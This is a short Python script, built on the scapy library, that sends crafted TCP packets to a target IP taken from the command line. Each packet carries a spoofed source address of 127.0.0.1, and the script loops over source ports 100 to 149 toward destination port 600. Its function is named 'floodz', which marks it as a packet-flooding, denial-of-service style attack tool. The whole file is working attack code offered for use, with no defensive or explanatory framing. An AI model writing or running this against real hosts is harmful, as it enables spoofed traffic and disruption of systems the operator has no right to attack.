from scapy.all import *
import sys

if len(sys.argv) < 2:
	print("Usage: Python " + sys.argv[0] + " <destinationIP>")
	sys.exit(1)

def floodz(source,target):
    for source_p in range(100,150):
        IPlayer = IP(src=source,dst=target)
        TCPlayer = TCP(sport=source_p,dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)

source = "127.0.0.1"
target = sys.argv[1]
floodz(source,target)
